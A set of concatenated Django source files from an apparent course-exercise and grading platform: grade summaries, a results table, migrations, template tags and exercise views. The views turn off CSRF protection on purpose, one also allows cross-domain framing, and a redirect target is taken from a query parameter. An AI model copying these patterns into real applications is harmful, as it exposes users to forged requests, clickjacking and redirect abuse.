                                self.unofficial
                                and s.grade > self.best_submission.grade
                            )
                        )
                    ):
                        self.best_submission = s
                        self.unofficial = True

    def get_submission_count(self):
        return self.submission_count

    def get_submissions(self):
        return self.submissions

    def get_best_submission(self):
        return self.best_submission

    def get_points(self):
        return self.best_submission.grade if self.best_submission and not self.unofficial else 0

    def get_penalty(self):
        return self.best_submission.late_penalty_applied if self.best_submission else None

    def is_missing_points(self):
        return self.get_points() < self.points_to_pass

    def is_full_points(self):
        return self.get_points() >= self.max_points

    def is_passed(self):
        return not self.is_missing_points()

    def is_submitted(self):
        return self.submission_count > 0

    def is_graded(self):
        return self.graded

    def is_unofficial(self):
        return self.unofficial

    def get_group(self):
        if self.submission_count > 0:
            s = self.submissions[0]
            if s.submitters.count() > 0:
                return StudentGroup.get_exact(
                    self.exercise.course_instance,
                    s.submitters.all()
                )
        return None

    def get_group_id(self):
        group = self.get_group()
        return group.id if group else 0


class ResultTable:
    """"""
    WARNING: Constructing this class is a heavy database operation.

    Models the table displaying the grades for each student on each exercise.
    Result tables are generated dynamically when needed and not stored
    in a database.
    """"""

    def __init__(self, course_instance):
        """"""
        Instantiates a new ResultTable for the given course instance.
        After initialization the table is filled with grades from the database.
        """"""
        self.course_instance = course_instance

        # Exercises on the course.
        self.exercises = list(self.__get_exercises())
        self.categories = course_instance.categories.all()

        # Students on the course.
        self.students = list(course_instance.get_student_profiles())

        # Empty results table.
        self.results = {
            student.id: {
                exercise.id: None for exercise in self.exercises
            } for student in self.students
        }
        self.results_by_category = {
            student.id: {
                category.id: 0 for category in self.categories
            } for student in self.students
        }

        # Fill the results with the data from the database.
        self.__collect_student_grades()


    def __get_exercises(self):
        content = CachedContent(self.course_instance)

        def get_descendant_ids(node):
            children = node['children']
            if children:
                return itertools.chain.from_iterable(
                    [get_descendant_ids(child) for child in children])
            return (node['id'],)

        root_node = { 'children': content.modules() }
        ids = get_descendant_ids(root_node)

        # Loop until end of ids raises StopIteration
        while True:
            id = next(ids)
            try:
                yield BaseExercise.objects.get(learningobject_ptr_id=id)
            except ObjectDoesNotExist:
                continue


    def __collect_student_grades(self):
        """"""
        Helper for the __init__.
        This method puts the data from the database in to the results table.
        """"""
        submissions = list(Submission.objects \
            .filter(
                exercise__course_module__course_instance=self.course_instance,
                status=Submission.STATUS.READY
            ).values(""submitters"", ""exercise"", ""exercise__category"") \
            .annotate(best=Max(""grade"")) \
            .order_by()) # Remove default ordering.
        for submission in submissions:
            student_id = submission[""submitters""]
            if student_id in self.results:
                self.results[student_id][submission[""exercise""]] = submission[""best""]
                self.results_by_category[student_id][submission[""exercise__category""]] += submission[""best""]


    def results_for_template(self):
        """"""
        Converts the results data into a form that is convenient for to use in a
        template. The columns of the table ordered according to the order of the
        exercises in self.exercises.
        """"""
        for_template = []
        for student in self.students:
            grades = [ self.results[student.id][exercise.id] \
                for exercise in self.exercises ]
            total = sum(g for g in grades if g is not None)
            for_template.append((student, grades, total))
        return for_template


    def max_sum(self):
        return sum(e.max_points for e in self.exercises)
/n/n/n/exercise/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations
from django.utils import timezone
import datetime
import exercise.submission_models
import lib.helpers
import exercise.exercise_models
import lib.fields


class Migration(migrations.Migration):

    dependencies = [
        ('inheritance', '0001_initial'),
        ('userprofile', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseModule',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('introduction', models.TextField(blank=True)),
                ('opening_time', models.DateTimeField(default=timezone.now)),
                ('closing_time', models.DateTimeField(default=timezone.now)),
                ('late_submissions_allowed', models.BooleanField(default=False)),
                ('late_submission_deadline', models.DateTimeField(default=timezone.now)),
                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),
                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),
            ],
            options={
                'ordering': ['closing_time', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='DeadlineRuleDeviation',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('extra_minutes', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='LearningObject',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),
                ('order', models.IntegerField(default=0)),
                ('name', models.CharField(max_length=255)),
                ('description', models.TextField(blank=True)),
                ('instructions', models.TextField(blank=True)),
                ('service_url', models.URLField(blank=True)),
            ],
            options={
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='BaseExercise',
            fields=[
                ('learningobject_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.LearningObject')),
                ('allow_assistant_grading', models.BooleanField(default=False)),
                ('min_group_size', models.PositiveIntegerField(default=1)),
                ('max_group_size', models.PositiveIntegerField(default=1)),
                ('max_submissions', models.PositiveIntegerField(default=10)),
                ('max_points', models.PositiveIntegerField(default=100)),
                ('points_to_pass', models.PositiveIntegerField(default=40)),
            ],
            options={
                'ordering': ['course_module__closing_time', 'course_module', 'order', 'id'],
            },
            bases=('exercise.learningobject',),
        ),
        migrations.CreateModel(
            name='ExerciseWithAttachment',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),
                ('files_to_submit', models.CharField(help_text='File names that user should submit, use pipe character to separate files', max_length=200, blank=True)),
                ('attachment', models.FileField(upload_to=exercise.exercise_models.build_upload_dir)),
            ],
            options={
                'verbose_name_plural': 'exercises with attachment',
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='AsynchronousExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='LearningObjectCategory',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=35)),
                ('description', models.TextField(blank=True)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),
                ('hidden_to', models.ManyToManyField(related_name='hidden_categories', null=True, to='userprofile.UserProfile', blank=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='MaxSubmissionsRuleDeviation',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('extra_submissions', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='StaticExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),
                ('exercise_page_content', models.TextField()),
                ('submission_page_content', models.TextField()),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='Submission',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('submission_time', models.DateTimeField(auto_now_add=True)),
                ('hash', models.CharField(default=lib.helpers.get_random_string, max_length=32)),
                ('feedback', models.TextField(blank=True)),
                ('assistant_feedback', models.TextField(blank=True)),
                ('status', models.CharField(default=b'initialized', max_length=32, choices=[(b'initialized', 'Initialized'), (b'waiting', 'Waiting'), (b'ready', 'Ready'), (b'error', 'Error')])),
                ('grade', models.IntegerField(default=0)),
                ('grading_time', models.DateTimeField(null=True, blank=True)),
                ('service_points', models.IntegerField(default=0)),
                ('service_max_points', models.IntegerField(default=0)),
                ('submission_data', lib.fields.JSONField(blank=True)),
                ('grading_data', lib.fields.JSONField(blank=True)),
            ],
            options={
                'ordering': ['-submission_time'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='SubmittedFile',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('param_name', models.CharField(max_length=128)),
                ('file_object', models.FileField(max_length=255, upload_to=exercise.submission_models.build_upload_dir)),
                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='SynchronousExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.AddField(
            model_name='submission',
            name='exercise',
            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='submission',
            name='grader',
            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='submission',
            name='submitters',
            field=models.ManyToManyField(related_name='submissions', to='userprofile.UserProfile'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='maxsubmissionsruledeviation',
            name='exercise',
            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='maxsubmissionsruledeviation',
            name='submitter',
            field=models.ForeignKey(to='userprofile.UserProfile'),
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='maxsubmissionsruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
        migrations.AlterUniqueTogether(
            name='learningobjectcategory',
            unique_together=set([('name', 'course_instance')]),
        ),
        migrations.AddField(
            model_name='learningobject',
            name='category',
            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='course_module',
            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='deadlineruledeviation',
            name='exercise',
            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='deadlineruledeviation',
            name='submitter',
            field=models.ForeignKey(to='userprofile.UserProfile'),
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='deadlineruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
    ]
/n/n/n/exercise/migrations/0005_auto_20150625_1821.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0004_auto_20150617_1033'),
    ]

    operations = [
        migrations.AlterField(
            model_name='coursemodule',
            name='closing_time',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='late_submission_deadline',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='opening_time',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='deadlineruledeviation',
            name='exercise',
            field=models.ForeignKey(to='exercise.BaseExercise'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='maxsubmissionsruledeviation',
            name='exercise',
            field=models.ForeignKey(to='exercise.BaseExercise'),
            preserve_default=True,
        ),
    ]
/n/n/n/exercise/migrations/0007_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('course', '0005_auto_20150625_1835'),
        ('deviations', '0001_initial')
    ]

    operations = [
        migrations.AlterField(
            model_name='learningobject',
            name='category',
            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='course_module',
            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule'),
            preserve_default=True,
        ),
    ]
/n/n/n/exercise/migrations/0011_auto_20151218_0857.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0010_auto_20151214_1714'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseChapter',
            fields=[
                ('learningobject_ptr', models.OneToOneField(parent_link=True, primary_key=True, to='exercise.LearningObject', serialize=False, auto_created=True)),
                ('generate_table_of_contents', models.BooleanField(default=False)),
            ],
            options={
            },
            bases=('exercise.learningobject',),
        ),
        migrations.AddField(
            model_name='learningobject',
            name='content_head',
            field=models.TextField(blank=True),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='parent',
            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='status',
            field=models.CharField(choices=[('ready', 'Ready'), ('hidden', 'Hidden'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='url',
            field=models.CharField(max_length=255, help_text='Input an URL identifier for this object.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')],
            blank=True, null=True, default=None),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='use_wide_column',
            field=models.BooleanField(help_text='Remove the third info column for more space.', default=False),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='description',
            field=models.TextField(help_text='Internal description is not presented on site.', blank=True),
            preserve_default=True,
        ),
    ]
/n/n/n/exercise/migrations/0014_ltiexercise.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0004_auto_20150828_1210'),
        ('exercise', '0013_auto_20151222_1320'),
    ]

    operations = [
        migrations.CreateModel(
            name='LTIExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(auto_created=True, primary_key=True, serialize=False, parent_link=True, to='exercise.BaseExercise')),
                ('lti_service', models.ForeignKey(to='external_services.LTIService')),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
    ]
/n/n/n/exercise/migrations/0015_auto_20160124_2139.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0002_auto_20150427_1717'),
        ('exercise', '0014_ltiexercise'),
    ]

    operations = [
        migrations.CreateModel(
            name='LearningObjectDisplay',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('learning_object', models.ForeignKey(to='exercise.LearningObject')),
                ('profile', models.ForeignKey(to='userprofile.UserProfile')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='status',
            field=models.CharField(choices=[('ready', 'Ready'), ('unlisted', 'Unlisted in table of contents'), ('enrollment', 'Enrollment questions'), ('hidden', 'Hidden from non course staff'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),
            preserve_default=True,
        ),
    ]
/n/n/n/exercise/templatetags/exercise.py/n/nimport json
from django import template
from django.db.models import Max, Min
from django.template.loader import render_to_string
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _

from course.models import CourseModule
from lib.errors import TagUsageError
from ..cache.content import CachedContent
from ..cache.points import CachedPoints
from ..exercise_summary import UserExerciseSummary
from ..models import LearningObjectDisplay, LearningObject, Submission, BaseExercise


register = template.Library()


def _prepare_now(context):
    if not 'now' in context:
        context['now'] = timezone.now()
    return context['now']


def _prepare_context(context, student=None):
    if not 'instance' in context:
        raise TagUsageError()
    instance = context['instance']
    _prepare_now(context)
    if not 'content' in context:
        context['content'] = CachedContent(instance)
    def points(user, key):
        if not key in context:
            context[key] = CachedPoints(instance, user, context['content'])
        return context[key]
    if student:
        return points(student, 'studentpoints')
    return points(context['request'].user, 'points')


def _get_toc(context, student=None):
    points = _prepare_context(context, student)
    context = context.flatten()
    context.update({
        'modules': points.modules_flatted(),
        'categories': points.categories(),
        'total': points.total(),
        'is_course_staff': context.get('is_course_staff', False),
    })
    return context


@register.inclusion_tag(""exercise/_user_results.html"", takes_context=True)
def user_results(context, student=None):
    values = _get_toc(context, student)
    values['total_json'] = json.dumps(values['total'])
    if student:
        values['is_course_staff'] = False
    return values


@register.inclusion_tag(""exercise/_user_toc.html"", takes_context=True)
def user_toc(context, student=None):
    return _get_toc(context, student)


@register.inclusion_tag(""exercise/_user_last.html"", takes_context=True)
def user_last(context):
    user = context['request'].user
    points = _prepare_context(context)
    if user.is_authenticated():
        last = LearningObjectDisplay.objects.filter(
            profile=user.userprofile,
            learning_object__status=LearningObject.STATUS.READY,
            learning_object__course_module__course_instance=context['instance'],
        ).select_related('learning_object').order_by('-timestamp').first()
        if last:
            entry,_,_,_ = points.find(last.learning_object)
            return {
                'last': entry,
                'last_time': last.timestamp,
            }
    return {
        'begin': points.begin(),
        'instance': context['instance'],
    }


@register.inclusion_tag(""exercise/_category_points.html"", takes_context=True)
def category_points(context, student=None):
    return _get_toc(context, student)


@register.inclusion_tag(""exercise/_submission_list.html"", takes_context=True)
def latest_submissions(context):
    submissions = context[""profile""].submissions \
        .filter(exercise__course_module__course_instance=context[""instance""]) \
        .order_by(""-id"")[:10]
    return {
        ""submissions"": submissions,
        ""title"": _(""Latest submissions""),
        ""empty"": _(""No submissions for this course.""),
    }


@register.filter
def max_submissions(exercise, user_profile):
    return exercise.max_submissions_for_student(user_profile)


@register.filter
def percent(decimal):
    return int(decimal * 100)


@register.filter
def submission_status(status):
    return Submission.STATUS[status]


def _points_data(obj, classes=None):
    if isinstance(obj, UserExerciseSummary):
        exercise = obj.exercise
        data = {
            'points': obj.get_points(),
            'max': exercise.max_points,
            'difficulty': exercise.difficulty,
            'required': exercise.points_to_pass,
            'confirm_the_level': exercise.category.confirm_the_level,
            'missing_points': obj.is_missing_points(),
            'passed': obj.is_passed(),
            'full_score': obj.is_full_points(),
            'submitted': obj.is_submitted(),
            'graded': obj.is_graded(),
            'official': not obj.is_unofficial(),
            'exercise_page': True,
        }
    elif isinstance(obj, Submission):
        exercise = obj.exercise
        data = {
            'points': obj.grade,
            'max': exercise.max_points,
            'difficulty': exercise.difficulty,
            'required': exercise.points_to_pass,
            'confirm_the_level': exercise.category.confirm_the_level,
            'missing_points': obj.grade < exercise.points_to_pass,
            'passed': obj.grade >= exercise.points_to_pass,
            'full_score': obj.grade >= exercise.max_points,
            'submitted': True,
            'graded': obj.is_graded,
            'official': obj.status != Submission.STATUS.UNOFFICIAL,
        }
        if not obj.is_graded and (
                    not exercise.category.confirm_the_level
                    or obj.status != Submission.STATUS.WAITING
                ):
            data['status'] = obj.status
    else:
        points = obj.get('points', 0)
        max_points = obj.get('max_points', 0)
        required = obj.get('points_to_pass', 0)
        data = {
            'points': points,
            'max': max_points,
            'difficulty': obj.get('difficulty', ''),
            'required': required,
            'confirm_the_level': obj.get('confirm_the_level', False),
            'missing_points': points < required,
            'passed': obj.get('passed', True),
            'full_score': points >= max_points,
            'submitted': obj.get('submission_count', 0) > 0,
            'graded': obj.get('graded', True),
            'status': obj.get('submission_status', False),
            'unconfirmed': obj.get('unconfirmed', False),
            'official': not obj.get('unofficial', False),
            'confirmable_points': obj.get('confirmable_points', False),
        }
    percentage = 0
    required_percentage = None
    if data['max'] > 0:
        percentage = int(round(100.0 * data['points'] / data['max']))
        if data['required']:
            required_percentage = int(round(100.0 * data['required'] / data['max']))
    data.update({
        'classes': classes,
        'percentage': percentage,
        'required_percentage': required_percentage,
    })
    return data


@register.inclusion_tag(""exercise/_points_progress.html"")
def points_progress(obj):
    return _points_data(obj)


@register.inclusion_tag(""exercise/_points_badge.html"")
def points_badge(obj, classes=None):
    return _points_data(obj, classes)


@register.assignment_tag(takes_context=True)
def max_group_size(context):
    points = _prepare_context(context)
    return points.total()['max_group_size']


@register.assignment_tag(takes_context=True)
def min_group_size(context):
    points = _prepare_context(context)
    return points.total()['min_group_size']


@register.assignment_tag(takes_context=True)
def module_accessible(context, entry):
    t = entry.get('opening_time')
    if t and t > _prepare_now(context):
        return False
    if entry.get('requirements'):
        points = _prepare_context(context)
        module = CourseModule.objects.get(id=entry['id'])
        return module.are_requirements_passed(points)
    return True


@register.assignment_tag
def get_grading_errors(submission):
    if not isinstance(submission.grading_data, dict):
        return """"
    grading_data = submission.grading_data.get('grading_data')
    if not isinstance(grading_data, str):
        return """"
    if grading_data.startswith('<pre>'):
        return grading_data[5:-6]
    try:
        return json.loads(grading_data).get('errors', """")
    except (AttributeError, TypeError, ValueError):
        return """"


@register.inclusion_tag(""exercise/_text_stats.html"", takes_context=True)
def exercise_text_stats(context, exercise):
    if not 'instance' in context:
        raise TagUsageError()
    instance = context['instance']

    if not 'student_count' in context:
        context['student_count'] = instance.students.count()
    total = context['student_count']

    if isinstance(exercise, int):
        num = instance.students.filter(submissions__exercise_id=exercise).distinct().count()
    else:
        num = exercise.number_of_submitters() if exercise else 0
    return {
        ""number"": num,
        ""percentage"": int(100 * num / total) if total else 0,
    }

@register.simple_tag
def get_format_info(format):
    format_infos = {
        'json' : {
            'name': 'json',
            'verbose_name': 'JSON',
        },
        'csv': {
            'name': 'csv',
            'verbose_name': 'CSV',
        },
        'excel.csv': {
            'name': 'excel.csv',
            'verbose_name': _('Excel compatible CSV'),
        },
    }
    try:
        return format_infos[format]
    except KeyError as e:
        raise RuntimeError('Invalid format: \'{}\''.format(format)) from e

@register.simple_tag
def get_format_info_list(formats):
    return [get_format_info(format) for format in formats.split()]
/n/n/n/exercise/views.py/n/nfrom django.conf import settings
from django.contrib import messages
from django.core.exceptions import MultipleObjectsReturned, PermissionDenied
from django.http.response import Http404, HttpResponse
from django.shortcuts import get_object_or_404
from django.utils.decorators import method_decorator
from django.utils.translation import ugettext_lazy as _
from django.views.decorators.clickjacking import xframe_options_exempt
from django.views.decorators.csrf import csrf_exempt
from django.views.static import serve

from authorization.permissions import ACCESS
from course.models import CourseModule
from course.viewbase import CourseInstanceBaseView, EnrollableViewMixin
from lib.remote_page import RemotePageNotFound, request_for_response
from lib.viewbase import BaseRedirectMixin, BaseView
from .models import LearningObject, LearningObjectDisplay
from .protocol.exercise_page import ExercisePage
from .submission_models import SubmittedFile, Submission
from .viewbase import ExerciseBaseView, SubmissionBaseView, SubmissionMixin, ExerciseModelBaseView, ExerciseTemplateBaseView

from .exercisecollection_models import ExerciseCollection
from .exercise_summary import UserExerciseSummary
from django.urls import reverse


class TableOfContentsView(CourseInstanceBaseView):
    template_name = ""exercise/toc.html""


class ResultsView(TableOfContentsView):
    template_name = ""exercise/results.html""


class ExerciseInfoView(ExerciseBaseView):
    ajax_template_name = ""exercise/_exercise_info.html""

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()


class ExerciseView(BaseRedirectMixin, ExerciseBaseView, EnrollableViewMixin):
    template_name = ""exercise/exercise.html""
    ajax_template_name = ""exercise/exercise_plain.html""
    post_url_name = ""exercise""
    access_mode = ACCESS.STUDENT

    # Allow form posts without the cross-site-request-forgery key.
    @method_decorator(csrf_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)

    def get_access_mode(self):
        access_mode = super().get_access_mode()

        # Loosen the access mode if exercise is enrollment
        if (self.exercise.status in (
                LearningObject.STATUS.ENROLLMENT,
                LearningObject.STATUS.ENROLLMENT_EXTERNAL,
              ) and access_mode == ACCESS.STUDENT):
            access_mode = ACCESS.ENROLL

        return access_mode

    def get(self, request, *args, **kwargs):
        exercisecollection = None
        exercisecollection_title = None
        submission_allowed = False
        disable_submit = False
        should_enroll = False
        issues = []
        students = [self.profile]

        if self.exercise.is_submittable:
            SUBMIT_STATUS = self.exercise.SUBMIT_STATUS
            submission_status, submission_allowed, issues, students = self.submission_check()
            self.get_summary_submissions()
            disable_submit = submission_status in [
                SUBMIT_STATUS.CANNOT_ENROLL,
                SUBMIT_STATUS.NOT_ENROLLED,
            ]
            should_enroll = submission_status == SUBMIT_STATUS.NOT_ENROLLED

        if (self.exercise.status == LearningObject.STATUS.MAINTENANCE
              or self.module.status == CourseModule.STATUS.MAINTENANCE):
            if self.is_course_staff:
                issue = _(""Exercise is in maintenance and content is hidden ""
                          ""from students."")
                messages.error(request, issue)
                issues.append(issue)
            else:
                page = ExercisePage(self.exercise)
                page.content = _('Unfortunately this exercise is currently '
                                 'under maintenance.')
                return super().get(request, *args, page=page, students=students, **kwargs)

        if hasattr(self.exercise, 'generate_table_of_contents') \
              and self.exercise.generate_table_of_contents:
            self.toc = self.content.children_hierarchy(self.exercise)
            self.note(""toc"")

        page = self.exercise.as_leaf_class().load(request, students,
            url_name=self.post_url_name)

        if self.profile:
            LearningObjectDisplay.objects.create(learning_object=self.exercise, profile=self.profile)

        if isinstance(self.exercise, ExerciseCollection):
            exercisecollection, exercisecollection_title = self.__load_exercisecollection(request)

        return super().get(request,
                           *args,
                           page=page,
                           students=students,
                           submission_allowed=submission_allowed,
                           disable_submit=disable_submit,
                           should_enroll=should_enroll,
                           issues=issues,
                           exercisecollection=exercisecollection,
                           exercisecollection_title=exercisecollection_title,
                           **kwargs)

    def post(self, request, *args, **kwargs):
        # Stop submit trials for e.g. chapters.
        # However, allow posts from exercises switched to maintenance status.
        if not self.exercise.is_submittable:
            return self.http_method_not_allowed(request, *args, **kwargs)

        new_submission = None
        page = ExercisePage(self.exercise)
        submission_status, submission_allowed, issues, students = (
            self.submission_check(True, request)
        )
        if submission_allowed:
            new_submission = Submission.objects.create_from_post(
                self.exercise, students, request)
            if new_submission:
                page = self.exercise.grade(request, new_submission,
                    url_name=self.post_url_name)

                # Enroll after succesfull enrollment exercise.
                if self.exercise.status in (
                    LearningObject.STATUS.ENROLLMENT,
                    LearningObject.STATUS.ENROLLMENT_EXTERNAL,
                ) and new_submission.status == Submission.STATUS.READY:
                    self.instance.enroll_student(self.request.user)

                # Redirect non AJAX normally to submission page.
                if not request.is_ajax() and ""__r"" not in request.GET:
                    return self.redirect(new_submission.get_absolute_url() +
                        (""?wait=1"" if page.is_wait else """"))
            else:
                messages.error(request,
                    _(""The submission could not be saved for some reason. ""
                      ""The submission was not registered.""))

            # Redirect non AJAX content page request back.
            if not request.is_ajax() and ""__r"" in request.GET:
                return self.redirect(request.GET[""__r""], backup=self.exercise);

        self.get_summary_submissions()
        return self.response(page=page, students=students,
            submission=new_submission)

    def submission_check(self, error=False, request=None):
        if not self.profile:
            issue = _(""You need to sign in and enroll to submit exercises."")
            messages.error(self.request, issue)
            return self.exercise.SUBMIT_STATUS.INVALID, False, [issue], []
        submission_status, issues, students = (
            self.exercise.check_submission_allowed(self.profile, request)
        )
        if len(issues) > 0:
            if error:
                messages.error(self.request, ""\n"".join(issues))
            else:
                messages.warning(self.request, ""\n"".join(issues))
        submission_allowed = (
            submission_status == self.exercise.SUBMIT_STATUS.ALLOWED
        )
        return submission_status, submission_allowed, issues, students


    def __load_exercisecollection(self, request):
        user = self.profile.user

        if user.is_authenticated():
            self.exercise.check_submission(user, no_update=True)

        target_exercises = []
        for t_exercise in self.exercise.exercises:
            it = t_exercise.parent
            ex_url = it.url
            it = it.parent
            while it is not None:
                ex_url = it.url + '/' + ex_url
                it = it.parent

            ex_name = t_exercise.name
            for candidate in t_exercise.name.split('|'):
                if request.LANGUAGE_CODE in candidate:
                    ex_name = candidate[len('{}:'.format(request.LANGUAGE_CODE)):]

            data = {""exercise"": t_exercise,
                    ""url"": reverse(""exercise"", kwargs={
                        ""course_slug"": t_exercise.course_module.course_instance.course.url,
                        ""instance_slug"": t_exercise.course_module.course_instance.url,
                        ""module_slug"": t_exercise.course_module.url,
                        ""exercise_path"": ex_url,
                    }),
                    ""title"": ex_name,
                    ""max_points"": t_exercise.max_points,
                    ""user_points"": UserExerciseSummary(t_exercise, request.user).get_points(),
                    }
            target_exercises.append(data)

        title = ""{}: {} - {}"".format(t_exercise.course_module.course_instance.course.name,
                                     t_exercise.course_module.course_instance.instance_name,
                                     t_exercise.category.name)

        return target_exercises, title


class ExercisePlainView(ExerciseView):
    raise_exception=True
    force_ajax_template=True
    post_url_name=""exercise-plain""

    # Allow form posts without the cross-site-request-forgery key.
    # Allow iframe in another domain.
    @method_decorator(csrf_exempt)
    @method_decorator(xframe_options_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)


class ExerciseModelView(ExerciseModelBaseView):
    template_name = ""exercise/model.html""
    ajax_template_name = ""exercise/_model_files.html""
    access_mode = ACCESS.ENROLLED

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()
        self.models = []
        for url,name in self.exercise.get_models():
            try:
                response = request_for_response(url)
            except RemotePageNotFound:
                self.models.append({'name': name})
            else:
                self.models.append({
                    'name': name,
                    'content': response.text,
                    'html': 'text/html' in response.headers.get('Content-Type'),
                })
        self.note('models')


class ExerciseTemplateView(ExerciseTemplateBaseView):
    template_name = ""exercise/template.html""
    ajax_template_name = ""exercise/_template_files.html""
    access_mode = ACCESS.ENROLLED

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()
        self.templates = []
        for url,name in self.exercise.get_templates():
            response = request_for_response(url)
